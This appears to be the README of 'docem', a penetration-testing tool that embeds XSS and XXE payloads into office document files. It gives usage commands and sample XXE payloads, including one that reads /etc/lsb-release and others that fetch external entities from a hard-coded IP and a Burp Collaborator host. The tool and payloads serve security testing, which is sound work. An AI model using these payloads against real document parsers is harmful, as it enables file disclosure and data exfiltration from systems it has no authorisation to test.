
```
_|_|_|                                                  
_|    _|    _|_|      _|_|_|    _|_|    _|_|_|  _|_|    
_|    _|  _|    _|  _|        _|_|_|_|  _|    _|    _|  
_|    _|  _|    _|  _|        _|        _|    _|    _|  
_|_|_|      _|_|      _|_|_|    _|_|_|  _|    _|    _|
```


**Disclaimer. Currently there are two tools: one for xss and one for xxe embedding - but that's only temporarily**


# ToDo

- Rewrite document_xss, cause it's terrible
	- [x] Stage 0. Working with template
		- [x] Prepare paths to all files in unpacked doc 
		- [x] First we find all files inside unpacked folder 
		- [x] Then we find all magic symbols 
	- [ ] Stage 1. Combie two tools in one
- [x] Read file with payloads
- [ ] Add flag to specify custom url to use in XXE
- [ ] Add flag to specify custom url to use in XSS
- [ ] Add ability to embed not only in xml but in unzip file also

# Tool

## Install 

```bash
pip3 install -r requirements.txt
```

## Usage docem

General 

```
python3 docem.py
```

- `-s` - path to a sample file
- `-pm` - payload mode
	- `per_document` - for every payload, embed payload in all places in all files and create new doc
	- `per_file` - for every payload, for every file inside a docuement, for all places inside file embed payload and create new doc
	- `per_place` - for every payload, for every place in every file, embed payload and create new doc
- `-pf` - payload file. Path to a file with payloads
- `-kt` - do not delete temp unpacked and modified folders
- `-h` - print help

Example 
```bash
./docem.py -s samples/xss_sample_0.odt -pf payloads/xss_tiny.txt -pm per_place
```


## Usage document.py

- `-s` - path to a sample file
- `-xu` - url to use in an external XXE
- `-xf` - file to use in an internal XXE
- `-kt` - do not delete temp unpacked and modified folders
- `-h` - print help


Example 

```bash
python3 document.py -s ../ODT/doc0.odt -xu http://123455.burpcollaborator.net
```


## Payloads

### XXE Payloads

**! Change IP/Domain address**

#### Internal XXE with file


```xml
<!DOCTYPE foo [<!ENTITY xxe_int_file SYSTEM "file:///etc/lsb-release">]>
```


`&xxe_int_file` - xxe parametr inside xml text

#### External XXE with file

```xml
<!DOCTYPE foo [<!ENTITY xxe_ext_file SYSTEM "http://138.197.217.227:5005/a.dtd/">]>
```


`&xxe_ext_file` - xxe parametr inside xml text

#### Internal paramter XXE with string

```
<!DOCTYPE foo [<!ENTITY % paramEntity "<!ENTITY xxe_param_string 'bar'>"> %paramEntity;>]
```


`&xxe_param_string` - xxe parametr inside xml text

